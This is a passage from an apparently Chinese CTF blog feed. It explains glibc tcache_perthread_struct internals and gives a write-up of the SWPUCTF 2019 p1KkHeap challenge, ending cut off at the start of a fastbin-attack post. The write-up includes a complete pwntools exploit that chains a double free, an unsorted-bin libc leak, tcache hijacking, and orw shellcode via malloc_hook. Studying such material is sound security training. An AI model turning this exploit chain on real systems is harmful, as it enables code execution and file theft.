class="line">0x555555a01180: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555a01190: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555a011a0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555a011b0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555a011c0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555a011d0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555a011e0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555a011f0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555a01200: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555a01210: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555a01220: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555a01230: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555a01240: 0x0000000000000000      0x0000000000000000</span><br></pre></td></tr></table></figure><p>正如上示， <code>tcache_perthread_struct</code>的size域为0x251（含标志位），实际大小为0x555555a01000到0x555555a01240的0x250大小的一块。<br>我们先记0x555555a01000为heapbase，heapbase+0x10到heapbase+0x40这一块为counts数组，heapbase+0x50到heapbase+0x250的大小0x200（0x40*8）的一块为entries数组<br>heapbase+0x50存放大小0x20的tcachebin的第一个chunk的fd地址，heapbase+0x58存放大小0x30的tcachebin的第一个chunk的fd地址，以此类推，在heap+0x88存放的是大小0x90的tcachebin的第一个chunk的mem地址，即0x555555a01260，heap+0x90和heap+0x98处同理<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0x555555a01080: 0x0000000000000000      0x0000555555a01260</span><br><span class="line">0x555555a01090: 0x0000555555a012f0      0x0000555555a01390</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">tcachebins</span><br><span class="line">0x90 [  1]: 0x555555a01260 ◂— 0</span><br><span class="line">0xa0 [  1]: 0x555555a012f0 ◂— 0</span><br><span class="line">0xb0 [  1]: 0x555555a01390 ◂— 0</span><br></pre></td></tr></table></figure><p>而<code>counts</code>数组位置记录的chunk数量是如何索引的呢？<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/40bx 0x555555a01010</span><br><span class="line">0x555555a01010: 0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x01</span><br><span class="line">0x555555a01018: 0x01    0x01    0x00    0x00    0x00    0x00    0x00    0x00</span><br><span class="line">0x555555a01020: 0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00</span><br><span class="line">0x555555a01028: 0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00</span><br><span class="line">0x555555a01030: 0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00</span><br></pre></td></tr></table></figure><p>如上所示为counts数组，在counts数组为char类型的版本中（也就是此处版本），在小端序情况下，从heap+0x10处开始，按照低字节到高字节（也就是低地址到高地址）存储。如上所示（在使用x&#x2F;gx查看de时候显示出的数据会按照小端序的方式以0x8字节为单位呈现，会使得在高地址的第八个0x01被理解为高位，所以改用x&#x2F;bx查看更加直观）<br>第1字节存放大小0x20的tcachebin的chunk数量，以此类推看到第8字节，9字节，10字节都是0x01，也就是我们释放的三个chunk。</p><h2 id="0x01-漏洞利用：修改counts数组和entries指针数组"><a href="#0x01-漏洞利用：修改counts数组和entries指针数组" class="headerlink" title="0x01 漏洞利用：修改counts数组和entries指针数组"></a>0x01 漏洞利用：修改counts数组和entries指针数组</h2><p>看tcache_free函数<br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="type">size_t</span> tc_idx = csize2tidx (size);</span><br><span class="line">    <span class="keyword">if</span> (tcache</span><br><span class="line">        &amp;&amp; tc_idx &lt; mp_.tcache_bins</span><br><span class="line">        &amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)<span class="comment">//&lt;7</span></span><br><span class="line">      &#123;</span><br><span class="line">        tcache_put (p, tc_idx);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>当对应大小的tcachebin中的chunk数量小于7时，会优先放入tcachebin，然而这里检查的是<code>tcache-&gt;counts</code>数组中的元素，也就是根据<code>tcache_perthread_struct</code>中的数据来判断，但却没有检查double free（在glibc2.29之后引入了key字段来防御double free，然而仍然可以绕过，关于不同版本glibc的堆管理和保护机制我再单独开一篇<a href="https://fuckth3w0r1d.github.io/2025/07/04/%E4%B8%8D%E5%90%8C%E7%89%88%E6%9C%AC%E4%B8%8Bglibc%E6%9C%89%E5%85%B3%E5%A0%86%E7%9A%84%E7%AE%A1%E7%90%86%E5%92%8C%E4%BF%9D%E6%8A%A4/">博客</a>来记录）<br>而<code>tcache_perthread_struct</code>本身也是可以free的，其也可直接当做大小0x250（0x290）的chunk来看待。同理，如果想要把<code>tcache_perthread_struct</code>放入unsorted bin，就要将<code>tcache-&gt;counts</code>中记录0x250（0x290）大小chunk的数量改为7<br>看在使用tcache时的malloc<br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE</span></span><br><span class="line">  <span class="comment">/* int_free also calls request2size, be careful to not pad twice.  */</span></span><br><span class="line">  <span class="type">size_t</span> tbytes;</span><br><span class="line">  checked_request2size (bytes, tbytes);</span><br><span class="line">  <span class="type">size_t</span> tc_idx = csize2tidx (tbytes);</span><br><span class="line">  MAYBE_INIT_TCACHE ();</span><br><span class="line">  DIAG_PUSH_NEEDS_COMMENT;</span><br><span class="line">  <span class="keyword">if</span> (tc_idx &lt; mp_.tcache_bins</span><br><span class="line">      <span class="comment">/*&amp;&amp; tc_idx &lt; TCACHE_MAX_BINS*/</span> <span class="comment">/* to appease gcc */</span></span><br><span class="line">      &amp;&amp; tcache</span><br><span class="line">      &amp;&amp; tcache-&gt;entries[tc_idx] != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">return</span> tcache_get (tc_idx);</span><br><span class="line">    &#125;</span><br><span class="line">  DIAG_POP_NEEDS_COMMENT;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>这里是根据<code>tcache-&gt;entries</code>数组的元素来索引tcachebins中的第一个chunk，同样也是根据<code>tcache_perthread_struct</code>中的数据来判断。<br>所以说，如果我们能够修改<code>tcache_perthread_struct</code>中的数据，也就能控制整个tcachebins。我们可以修改counts数组的数量，以将chunk放到我们想放置的其他bins中（比如放入unsortedbin来泄露malloc_hook，libc），也可以修改entries数组的数据来malloc任意地址。<br></p><h2 id="0x02-以SWPUCTF-2019-p1KkHeap为例"><a href="#0x02-以SWPUCTF-2019-p1KkHeap为例" class="headerlink" title="0x02 以SWPUCTF_2019_p1KkHeap为例"></a>0x02 以SWPUCTF_2019_p1KkHeap为例</h2><h3 id="复盘-tcache-perthread-struct-attack-unsortedbin-leak-uaf-double-free-orw"><a href="#复盘-tcache-perthread-struct-attack-unsortedbin-leak-uaf-double-free-orw" class="headerlink" title="复盘&#x2F;tcache_perthread_struct attack&#x2F;unsortedbin leak&#x2F;uaf&#x2F;double free&#x2F;orw"></a>复盘&#x2F;tcache_perthread_struct attack&#x2F;unsortedbin leak&#x2F;uaf&#x2F;double free&#x2F;orw</h3><p>先放源码<br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall __noreturn <span class="title function_">main</span><span class="params">(__int64 a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v3; <span class="comment">// rdi</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  sub_B0A();</span><br><span class="line">  v3 = <span class="string">&quot;                           Welcome to SWPUCTF 2019&quot;</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;                           Welcome to SWPUCTF 2019&quot;</span>);</span><br><span class="line">  <span class="keyword">while</span> ( dword_202024 &gt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    menu();</span><br><span class="line">    v4 = sub_1076();</span><br><span class="line">    <span class="keyword">if</span> ( v4 == <span class="number">3</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      Edit();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( v4 &gt; <span class="number">3</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v4 == <span class="number">5</span> )</span><br><span class="line">        Exit();</span><br><span class="line">      <span class="keyword">if</span> ( v4 &lt; <span class="number">5</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        Delete(v3, a2);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> ( v4 == <span class="number">666</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v3 = <span class="string">&quot;p1Kk wants a boyfriend!&quot;</span>;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;p1Kk wants a boyfriend!&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( v4 == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      Add(v3, a2);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( v4 == <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      Show(v3, a2);</span><br><span class="line">    &#125;</span><br><span class="line">    --dword_202024;</span><br><span class="line">  &#125;</span><br><span class="line">  Exit();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>菜单，限制操作次数至多为0x12，看选项函数<br></p><p>add<br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">sub_E1E</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line">  <span class="type">size_t</span> size; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;size: &quot;</span>);</span><br><span class="line">  size = sub_1076();</span><br><span class="line">  <span class="keyword">if</span> ( size &gt; <span class="number">0x100</span> )</span><br><span class="line">    Exit();</span><br><span class="line">  v1 = sub_DA9();</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt;= <span class="number">7</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    qword_202100[v1] = <span class="built_in">malloc</span>(size);</span><br><span class="line">    dword_2020E0[v1] = size;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Done!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最多申请八次堆，每次返回不同索引，size至多为0x100<br>edit<br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">sub_EC1</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int64 v1; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;id: &quot;</span>);</span><br><span class="line">  v1 = sub_1076();</span><br><span class="line">  <span class="keyword">if</span> ( v1 &gt; <span class="number">7</span> )</span><br><span class="line">    Exit();</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;content: &quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, *((<span class="type">void</span> **)&amp;qword_202100 + v1), dword_2020E0[v1]);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Done!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>dword_2020E0数组记录了chunk大小，不能溢出<br>show<br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">sub_F58</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int64 v1; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;id: &quot;</span>);</span><br><span class="line">  v1 = sub_1076();</span><br><span class="line">  <span class="keyword">if</span> ( v1 &gt; <span class="number">7</span> )</span><br><span class="line">    Exit();</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;content: &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>((<span class="type">const</span> <span class="type">char</span> *)qword_202100[v1]);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Done!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>delete<br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">Delete</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v0; <span class="comment">// eax</span></span><br><span class="line">  __int64 v2; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( dword_202020 &lt;= <span class="number">0</span> )</span><br><span class="line">    Exit();</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;id: &quot;</span>);</span><br><span class="line">  sub_1076();</span><br><span class="line">  v2 = v0;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int64)v0 &gt; <span class="number">7</span> )</span><br><span class="line">    Exit();</span><br><span class="line">  <span class="built_in">free</span>((<span class="type">void</span> *)qword_202100[v0]);</span><br><span class="line">  dword_2020E0[v2] = <span class="number">0</span>;</span><br><span class="line">  --dword_202020;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Done!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>dword_202020限制只能free三次，指针没置零。但是dword_2020E0数组对应项置零，free后无法edit，只能show。<br></p><p>那么思路就是，先泄露tcache_perthread_struct的地址，然后修改counts数组，将chunk放到unsortedbin，泄露出malloc_hook<br>我们还能注意到，程序映射了一块rwx内存位于0x66660000，可读可写可执行<br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( mmap((<span class="type">void</span> *)<span class="number">0x66660000</span>, <span class="number">0x1000u</span>LL, <span class="number">7</span>, <span class="number">34</span>, <span class="number">-1</span>, <span class="number">0LL</span>) != (<span class="type">void</span> *)<span class="number">1717960704</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  <span class="built_in">memset</span>((<span class="type">void</span> *)<span class="number">0x66660000</span>, <span class="number">0</span>, <span class="number">0x1000u</span>LL);</span><br><span class="line">  <span class="built_in">strcpy</span>((<span class="type">char</span> *)<span class="number">0x66660000</span>, <span class="string">&quot;SWPUCTF_p1Kk&quot;</span>);</span><br></pre></td></tr></table></figure><p>那么思路很清晰了，只需要向这块区域写入shellcode即可。但是写入后发现无法getshell，后来发现程序开启了沙箱。那么用shellcode进行orw即可。<br>exp<br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">io=remote(<span class="string">&#x27;node5.anna.nssctf.cn&#x27;</span>,<span class="number">20392</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/home/turing/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#0x12次操作</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">alloc</span>(<span class="params">size</span>):  <span class="comment">#最多8次alloc</span></span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;Choice: &quot;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;size: &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;Done!\n&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;Choice: &quot;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;id: &quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;content: &quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,content</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;Choice: &quot;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;id: &quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;content: &quot;</span>)</span><br><span class="line">    io.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):   <span class="comment">#最多3次free</span></span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;Choice: &quot;</span>,<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;id: &quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;Done!\n&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exit</span>():</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;Choice: &quot;</span>,<span class="string">b&#x27;5&#x27;</span>)</span><br><span class="line"></span><br><span class="line">alloc(<span class="number">0x99</span>) <span class="comment">#0</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">heap_base=u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x260</span></span><br><span class="line">log.success(<span class="built_in">hex</span>(heap_base))</span><br><span class="line">alloc(<span class="number">0x99</span>) <span class="comment">#1</span></span><br><span class="line">edit(<span class="number">1</span>,p64(heap_base+<span class="number">0x10</span>))</span><br><span class="line">io.recvuntil(<span class="string">b&quot;Done!\n&quot;</span>)</span><br><span class="line">alloc(<span class="number">0x99</span>) <span class="comment">#2</span></span><br><span class="line">alloc(<span class="number">0x99</span>) <span class="comment">#3 指向tcache_perthread_struct(heap_base+0x10)</span></span><br><span class="line">edit(<span class="number">3</span>,<span class="string">b&#x27;\x07&#x27;</span>*<span class="number">0x40</span>) <span class="comment">#修改tcache_perthread_struct中的对应tcache bins的chunk数量</span></span><br><span class="line">io.recvuntil(<span class="string">b&quot;Done!\n&quot;</span>)</span><br><span class="line">free(<span class="number">3</span>) <span class="comment">#进入unsorted bin</span></span><br><span class="line">show(<span class="number">3</span>)</span><br><span class="line">malloc_hook_add=u64(io.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">96</span>-<span class="number">0x10</span><span class="comment"># 泄露出malloc_hook，在较低版本中unsortedbin的表头距main_arena起始地址的偏移为88，这个版本为96。而malloc_hook距main_arena就是0x10</span></span><br><span class="line">log.success(<span class="built_in">hex</span>(malloc_hook_add))</span><br><span class="line"><span class="comment">#libcbase=malloc_hook_add-libc.sym[&#x27;__malloc_hook&#x27;]</span></span><br><span class="line">alloc(<span class="number">0x100</span>) <span class="comment">#4，将tcache_perthread_struct申请回来了</span></span><br><span class="line">magic_add=<span class="number">0x66660000</span></span><br><span class="line">edit(<span class="number">4</span>,<span class="string">b&#x27;\xff&#x27;</span>*<span class="number">0x40</span>+<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x30</span>+p64(malloc_hook_add)+p64(magic_add)) <span class="comment">#修改0x80和0x90的tcachebin为malloc_hook和rwx内存</span></span><br><span class="line">io.recvuntil(<span class="string">b&quot;Done!\n&quot;</span>)</span><br><span class="line">flag_add=heap_base+<span class="number">0x270</span> <span class="comment">#将flag读入堆区</span></span><br><span class="line">shellcode=shellcraft.<span class="built_in">open</span>(<span class="string">&quot;/flag&quot;</span>)</span><br><span class="line">shellcode+=shellcraft.read(<span class="number">3</span>,flag_add,<span class="number">0x30</span>)</span><br><span class="line">shellcode+=shellcraft.write(<span class="number">1</span>,flag_add,<span class="number">0x30</span>)</span><br><span class="line">shellcode=asm(shellcode)</span><br><span class="line">alloc(<span class="number">0x80</span>) <span class="comment">#5 申请到rwx内存</span></span><br><span class="line">edit(<span class="number">5</span>, shellcode)</span><br><span class="line">io.recvuntil(<span class="string">b&quot;Done!&quot;</span>)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">alloc(<span class="number">0x70</span>) <span class="comment">#6 申请到malloc_hook地址</span></span><br><span class="line">edit(<span class="number">6</span>, p64(magic_add))<span class="comment">#将malloc_hook指向shellcode</span></span><br><span class="line">alloc(<span class="number">0x10</span>) <span class="comment">#7 执行malloc_hook</span></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
          <category> heap </category>
          
          <category> tcache attack </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 复盘 </tag>
            
            <tag> 笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>关于fastbin attack与unsortedbin leak</title>
      <link href="/2025/07/01/%E5%85%B3%E4%BA%8Efastbin%20attack%E4%B8%8Eunsortedbin%20leak/"/>
      <url>/2025/07/01/%E5%85%B3%E4%BA%8Efastbin%20attack%E4%B8%8Eunsortedbin%20leak/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h2><p>以三道循序渐进的题目为例来分析吧。</p><h2 id="0x01-hitcontraining-uaf-hacknote"><a href="#0x01-hitcontraining-uaf-hacknote" class="headerlink" title="0x01 hitcontraining_uaf &#x2F; hacknote"></a>0x01 hitcontraining_uaf &#x2F; hacknote</h2><h3 id="复盘-uaf-heapoverflow"><a href="#复盘-uaf-heapoverflow" class="headerlink" title="复盘&#x2F;uaf&#x2F;heapoverflow"></a>复盘&#x2F;uaf&#x2F;heapoverflow</h3><p>题目源码如下<br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl __noreturn <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">4</span>]; <span class="comment">// [esp+0h] [ebp-Ch] BYREF</span></span><br><span class="line">  <span class="type">int</span> *p_argc; <span class="comment">// [esp+4h] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line">  p_argc = &amp;argc;</span><br><span class="line">  